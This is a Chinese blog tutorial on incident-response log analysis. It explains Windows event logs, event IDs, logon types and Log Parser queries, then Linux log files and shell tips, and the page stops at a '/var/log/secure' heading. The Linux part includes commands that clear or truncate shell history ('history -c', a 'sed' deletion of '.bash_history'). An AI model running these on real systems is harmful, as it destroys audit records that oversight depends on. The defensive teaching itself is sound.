<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>应急响应之日志分析 | Valen的博客</title><meta name="keywords" content="应急响应"><meta name="author" content="Valen"><meta name="copyright" content="Valen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="学习一下应急响应之日志分析。">
<meta property="og:type" content="article">
<meta property="og:title" content="应急响应之日志分析">
<meta property="og:url" content="https://0314valen.github.io/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Valen的博客">
<meta property="og:description" content="学习一下应急响应之日志分析。">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img.paulzzh.tech/touhou/random">
<meta property="article:published_time" content="2022-07-01T16:00:00.000Z">
<meta property="article:modified_time" content="2022-09-20T14:17:51.002Z">
<meta property="article:author" content="Valen">
<meta property="article:tag" content="应急响应">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img.paulzzh.tech/touhou/random"><link rel="shortcut icon" href="/image/UI_images/favicon.png"><link rel="canonical" href="https://0314valen.github.io/article/2022-07-02-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8B%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '应急响应之日志分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-09-20 22:17:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/image/UI_images/avatar.jpg" onerror="onerror=null;src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://img.paulzzh.tech/touhou/random')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Valen的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">应急响应之日志分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-01T16:00:00.000Z" title="发表于 2022-07-02 00:00:00">2022-07-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-09-20T14:17:51.002Z" title="更新于 2022-09-20 22:17:51">2022-09-20</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/">安全运维</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>34分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="应急响应之日志分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>学习一下应急响应之日志分析。</p>
<span id="more"></span>

<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><h3 id="0x01-Windows事件日志简介"><a href="#0x01-Windows事件日志简介" class="headerlink" title="0x01 Windows事件日志简介"></a>0x01 Windows事件日志简介</h3><p>Windows系统日志是记录系统中硬件、软件和系统问题的信息，同时还可以监视系统中发生的事件。用户可以通过它来检查错误发生的原因，或者寻找受到攻击时攻击者留下的痕迹。</p>
<p>Windows主要有以下三类日志记录系统事件：应用程序日志、系统日志和安全日志。</p>
<p><strong>系统日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等。系统日志中记录的时间类型由Windows NT/2000操作系统预先定义。</span><br><span class="line"></span><br><span class="line">默认位置： %SystemRoot%\System32\Winevt\Logs\System.evtx</span><br></pre></td></tr></table></figure>

<p><strong>应用程序日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误，程序开发人员可以自行决定监视哪些事件。如果某个应用程序出现崩溃情况，那么我们可以从程序事件日志中找到相应的记录，也许会有助于你解决问题。 </span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx</span><br></pre></td></tr></table></figure>

<p><strong>安全日志</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。安全日志也是调查取证中最常用到的日志。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略，以便当安全性日志满后使系统停止响应。</span><br><span class="line"></span><br><span class="line">默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx</span><br></pre></td></tr></table></figure>

<p>​    系统和应用程序日志存储着故障排除信息，对于系统管理员更为有用。 安全日志记录着事件审计信息，包括用户验证（登录、远程访问等）和特定用户在认证后对系统做了什么，对于调查人员而言，更有帮助。 </p>
<h3 id="0X02-审核策略与事件查看器"><a href="#0X02-审核策略与事件查看器" class="headerlink" title="0X02 审核策略与事件查看器"></a>0X02 审核策略与事件查看器</h3><p>Windows Server 2008 R2 系统的审核功能在默认状态下并没有启用 ，建议开启审核策略，若日后系统出现故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵者的信息等。</p>
<p>PS：默认状态下，也会记录一些简单的日志，日志默认大小20M</p>
<p><strong>设置1</strong>：开始 → 管理工具 → 本地安全策略 → 本地策略 → 审核策略，参考配置操作：</p>
<p><img src="/image/media/2022/secops/log-1-1.png"></p>
<p><strong>设置2</strong>：设置合理的日志属性，即日志最大大小、事件覆盖阀值等： </p>
<p><img src="/image/media/2022/secops/log-1-2.png"></p>
<p><strong>查看系统日志方法：</strong></p>
<ol>
<li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong></p>
</li>
<li><p>按 “<strong>Window+R</strong>“，输入 ”<strong>eventvwr.msc</strong>“ 也可以直接进入“<strong>事件查看器</strong>” </p>
<p><img src="/image/media/2022/secops/log-1-3.png"></p>
</li>
</ol>
<h3 id="0x03-事件日志分析"><a href="#0x03-事件日志分析" class="headerlink" title="0x03 事件日志分析"></a>0x03 事件日志分析</h3><p>对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明：</p>
<table>
<thead>
<tr>
<th align="left">事件ID</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">4624</td>
<td>登录成功</td>
</tr>
<tr>
<td align="left">4625</td>
<td>登录失败</td>
</tr>
<tr>
<td align="left">4634</td>
<td>注销成功</td>
</tr>
<tr>
<td align="left">4647</td>
<td>用户启动的注销</td>
</tr>
<tr>
<td align="left">4672</td>
<td>使用超级用户（如管理员）进行登录</td>
</tr>
<tr>
<td align="left">4720</td>
<td>创建用户</td>
</tr>
</tbody></table>
<p>每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式：</p>
<table>
<thead>
<tr>
<th align="left">登录类型</th>
<th>描述</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td>交互式登录（Interactive）</td>
<td>用户在本地进行登录。</td>
</tr>
<tr>
<td align="left">3</td>
<td>网络（Network）</td>
<td>最常见的情况就是连接到共享文件夹或共享打印机时。</td>
</tr>
<tr>
<td align="left">4</td>
<td>批处理（Batch）</td>
<td>通常表明某计划任务启动。</td>
</tr>
<tr>
<td align="left">5</td>
<td>服务（Service）</td>
<td>每种服务都被配置在某个特定的用户账号下运行。</td>
</tr>
<tr>
<td align="left">7</td>
<td>解锁（Unlock）</td>
<td>屏保解锁。</td>
</tr>
<tr>
<td align="left">8</td>
<td>网络明文（NetworkCleartext）</td>
<td>登录的密码在网络上是通过明文传输的，如FTP。</td>
</tr>
<tr>
<td align="left">9</td>
<td>新凭证（NewCredentials）</td>
<td>使用带/Netonly参数的RUNAS命令运行一个程序。</td>
</tr>
<tr>
<td align="left">10</td>
<td>远程交互，（RemoteInteractive）</td>
<td>通过终端服务、远程桌面或远程协助访问计算机。</td>
</tr>
<tr>
<td align="left">11</td>
<td>缓存交互（CachedInteractive）</td>
<td>以一个域用户登录而又没有域控制器可用</td>
</tr>
</tbody></table>
<p>关于更多EVENT ID，详见微软官方网站上找到了“Windows Vista 和 Windows Server 2008 中的安全事件的说明”。</p>
<blockquote>
<p>原文链接 ：<a target="_blank" rel="noopener" href="https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008">https://support.microsoft.com/zh-cn/help/977519/description-of-security-events-in-windows-7-and-in-windows-server-2008</a></p>
</blockquote>
<p>案例1：可以利用eventlog事件来查看系统账号登录情况：</p>
<ol>
<li><p>在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p>
</li>
<li><p>在事件查看器中，单击<strong>“安全”</strong>，查看安全日志；</p>
</li>
<li><p>在安全日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p>
<p>4624  –登录成功<br>4625  –登录失败<br>4634 – 注销成功<br>4647 – 用户启动的注销<br>4672 – 使用超级用户（如管理员）进行登录</p>
</li>
</ol>
<p>我们输入事件ID：4625进行日志筛选，发现事件ID：4625，事件数175904，即用户登录失败了175904次，那么这台服务器管理员账号可能遭遇了暴力猜解。</p>
<p><img src="/image/media/2022/secops/log-1-4.png"></p>
<p>案例2：可以利用eventlog事件来查看计算机开关机的记录： </p>
<p>1、在<strong>“开始”</strong>菜单上，依次指向<strong>“所有程序”</strong>、<strong>“管理工具”</strong>，然后单击<strong>“事件查看器”</strong>；</p>
<p>2、在事件查看器中，单击<strong>“系统”</strong>，查看系统日志；</p>
<p>3、在系统日志右侧操作中，点击<strong>“筛选当前日志”</strong>，输入事件ID进行筛选。</p>
<p>其中事件ID 6006 ID6005、 ID 6009就表示不同状态的机器的情况（开关机）。<br>    6005 信息 EventLog 事件日志服务已启动。(开机)<br>    6006 信息 EventLog 事件日志服务已停止。(关机)<br>    6009 信息 EventLog 按ctrl、alt、delete键(非正常)关机</p>
<p>我们输入事件ID：6005-6006进行日志筛选，发现了两条在2018/7/6 17:53:51左右的记录，也就是我刚才对系统进行重启的时间。</p>
<p><img src="/image/media/2022/secops/log-1-5.png"></p>
<h3 id="0x04-日志分析工具"><a href="#0x04-日志分析工具" class="headerlink" title="0x04 日志分析工具"></a>0x04 日志分析工具</h3><h4 id="Log-Parser"><a href="#Log-Parser" class="headerlink" title="Log Parser"></a>Log Parser</h4><p>Log Parser（是微软公司出品的日志分析工具，它功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory。它可以像使用 SQL 语句一样查询分析这些数据，甚至可以把分析结果以各种图表的形式展现出来。</p>
<p>Log Parser 2.2下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=24659">https://www.microsoft.com/en-us/download/details.aspx?id=24659</a></p>
<p>Log Parser 使用示例：<a target="_blank" rel="noopener" href="https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/">https://mlichtenberg.wordpress.com/2011/02/03/log-parser-rocks-more-than-50-examples/</a></p>
<p><img src="/image/media/2022/secops/log-1-6.png"></p>
<p><strong>基本查询结构</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;</span><br></pre></td></tr></table></figure>

<p><strong>使用Log Parser分析日志</strong></p>
<p>1、查询登录成功的事件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">登录成功的所有事件</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">指定登录时间范围的事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where TimeGenerated&gt;&#x27;2018-06-19 23:32:11&#x27; and TimeGenerated&lt;&#x27;2018-06-20 23:34:00&#x27; and EventID=4624&quot;</span><br><span class="line"></span><br><span class="line">提取登录成功的用户名和IP：</span><br><span class="line">LogParser.exe -i:EVT  –o:DATAGRID  &quot;SELECT EXTRACT_TOKEN(Message,13,&#x27; &#x27;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&#x27;|&#x27;) as Username,EXTRACT_TOKEN(Message,38,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 2、查询登录失败的事件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">登录失败的所有事件：</span><br><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT *  FROM c:\Security.evtx where EventID=4625&quot;</span><br><span class="line"></span><br><span class="line">提取登录失败用户名进行聚合统计：</span><br><span class="line">LogParser.exe  -i:EVT &quot;SELECT  EXTRACT_TOKEN(Message,13,&#x27; &#x27;)  as EventType,EXTRACT_TOKEN(Message,19,&#x27; &#x27;) as user,count(EXTRACT_TOKEN(Message,19,&#x27; &#x27;)) as Times,EXTRACT_TOKEN(Message,39,&#x27; &#x27;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3、系统历史开关机记录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LogParser.exe -i:EVT –o:DATAGRID  &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LogParser-Lizard"><a href="#LogParser-Lizard" class="headerlink" title="LogParser Lizard"></a>LogParser Lizard</h4><p>对于GUI环境的Log Parser Lizard，其特点是比较易于使用，甚至不需要记忆繁琐的命令，只需要做好设置，写好基本的SQL语句，就可以直观的得到结果。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="http://www.lizard-labs.com/log_parser_lizard.aspx">http://www.lizard-labs.com/log_parser_lizard.aspx</a></p>
<p>依赖包：Microsoft .NET Framework 4 .5，下载地址：<a target="_blank" rel="noopener" href="https://www.microsoft.com/en-us/download/details.aspx?id=42642">https://www.microsoft.com/en-us/download/details.aspx?id=42642</a></p>
<p>查询最近用户登录情况：</p>
<p><img src="/image/media/2022/secops/log-1-7.png"></p>
<h4 id="Event-Log-Explorer"><a href="#Event-Log-Explorer" class="headerlink" title="Event Log Explorer"></a>Event Log Explorer</h4><p>Event Log Explorer是一款非常好用的Windows日志分析工具。可用于查看，监视和分析跟事件记录，包括安全，系统，应用程序和其他微软Windows 的记录被记载的事件，其强大的过滤功能可以快速的过滤出有价值的信息。</p>
<p>下载地址：<a target="_blank" rel="noopener" href="https://event-log-explorer.en.softonic.com/">https://event-log-explorer.en.softonic.com/</a></p>
<p><img src="/image/media/2022/secops/log-1-8.png"></p>
<p>参考链接：</p>
<p>Windows日志分析   <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ">https://mp.weixin.qq.com/s/ige5UO8WTuOOO3yRw-LeqQ</a></p>
<h2 id="Linux日志分析"><a href="#Linux日志分析" class="headerlink" title="Linux日志分析"></a>Linux日志分析</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>Linux系统拥有非常灵活和强大的日志功能，可以保存几乎所有的操作记录，并可以从中检索出我们需要的信息。 本文简介一下Linux系统日志及日志分析技巧。</p>
<h3 id="0x01-日志简介"><a href="#0x01-日志简介" class="headerlink" title="0x01 日志简介"></a>0x01 日志简介</h3><p>日志默认存放位置：/var/log/</p>
<p>查看日志配置情况：more /etc/rsyslog.conf</p>
<table>
<thead>
<tr>
<th align="center">日志文件</th>
<th align="center">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="center">/var/log/cron</td>
<td align="center">记录了系统定时任务相关的日志</td>
</tr>
<tr>
<td align="center">/var/log/cups</td>
<td align="center">记录打印信息的日志</td>
</tr>
<tr>
<td align="center">/var/log/dmesg</td>
<td align="center">记录了系统在开机时内核自检的信息，也可以使用dmesg命令直接查看内核自检信息</td>
</tr>
<tr>
<td align="center">/var/log/mailog</td>
<td align="center">记录邮件信息</td>
</tr>
<tr>
<td align="center">/var/log/message</td>
<td align="center">记录系统重要信息的日志。这个日志文件中会记录Linux系统的绝大多数重要信息，如果系统出现问题时，首先要检查的就应该是这个日志文件</td>
</tr>
<tr>
<td align="center">/var/log/btmp</td>
<td align="center">记录错误登录日志，这个文件是二进制文件，不能直接vi查看，而要使用lastb命令查看</td>
</tr>
<tr>
<td align="center">/var/log/lastlog</td>
<td align="center">记录系统中所有用户最后一次登录时间的日志，这个文件是二进制文件，不能直接vi，而要使用lastlog命令查看</td>
</tr>
<tr>
<td align="center">/var/log/wtmp</td>
<td align="center">永久记录所有用户的登录、注销信息，同时记录系统的启动、重启、关机事件。同样这个文件也是一个二进制文件，不能直接vi，而需要使用last命令来查看</td>
</tr>
<tr>
<td align="center">/var/log/utmp</td>
<td align="center">记录当前已经登录的用户信息，这个文件会随着用户的登录和注销不断变化，只记录当前登录用户的信息。同样这个文件不能直接vi，而要使用w,who,users等命令来查询</td>
</tr>
<tr>
<td align="center">/var/log/secure</td>
<td align="center">记录验证和授权方面的信息，只要涉及账号和密码的程序都会记录，比如SSH登录，su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</td>
</tr>
</tbody></table>
<p>比较重要的几个日志：<br>    登录失败记录：/var/log/btmp     //lastb<br>    最后一次登录：/var/log/lastlog  //lastlog<br>    登录成功记录: /var/log/wtmp     //last<br>    登录日志记录：/var/log/secure   </p>
<p>​    目前登录用户信息：/var/run/utmp  //w、who、users</p>
<p>​    历史命令记录：history<br>​    仅清理当前用户： history -c</p>
<h3 id="0x02-日志分析技巧"><a href="#0x02-日志分析技巧" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><h4 id="A、常用的shell命令"><a href="#A、常用的shell命令" class="headerlink" title="A、常用的shell命令"></a>A、常用的shell命令</h4><p>Linux下常用的shell命令如：find、grep 、egrep、awk、sed</p>
<p>小技巧：</p>
<p>1、grep显示前后几行信息:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">	标准unix/linux下的grep通过下面參数控制上下文：</span><br><span class="line">​	grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">​	grep -B 5 foo file 显示foo及前5行</span><br><span class="line">​	grep -A 5 foo file 显示foo及后5行</span><br><span class="line">​	查看grep版本号的方法是</span><br><span class="line">​	grep -V</span><br></pre></td></tr></table></figure>

<p>2、grep 查找含有某字符串的所有文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;hello,world!&quot; </span><br><span class="line">* : 表示当前目录所有文件，也可以是某个文件名</span><br><span class="line">-r 是递归查找</span><br><span class="line">-n 是显示行号</span><br><span class="line">-R 查找所有文件包含子目录</span><br><span class="line">-i 忽略大小写</span><br></pre></td></tr></table></figure>

<p>3、如何显示一个文件的某几行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat input_file | tail -n +1000 | head -n 2000</span><br><span class="line">#从第1000行开始，显示2000行。即显示1000~2999行</span><br></pre></td></tr></table></figure>


<p>4、find /etc -name init </p>
<pre><code>//在目录/etc中查找文件init
</code></pre>
<p>5、只是显示/etc/passwd的账户</p>
<pre><code>`cat /etc/passwd |awk  -F &#39;:&#39;  &#39;&#123;print $1&#125;&#39;`  
//awk -F指定域分隔符为&#39;:&#39;，将记录按指定的域分隔符划分域，填充域，​$0则表示所有域,$1表示第一个域,​$n表示第n个域。
</code></pre>
<p>6、sed -i ‘153,$d’ .bash_history</p>
<pre><code>删除历史操作记录，只保留前153行
</code></pre>
<h4 id="B、日志分析技巧"><a href="#B、日志分析技巧" class="headerlink" title="B、日志分析技巧"></a>B、日志分析技巧</h4><p><strong>A、/var/log/secure</strong></p>
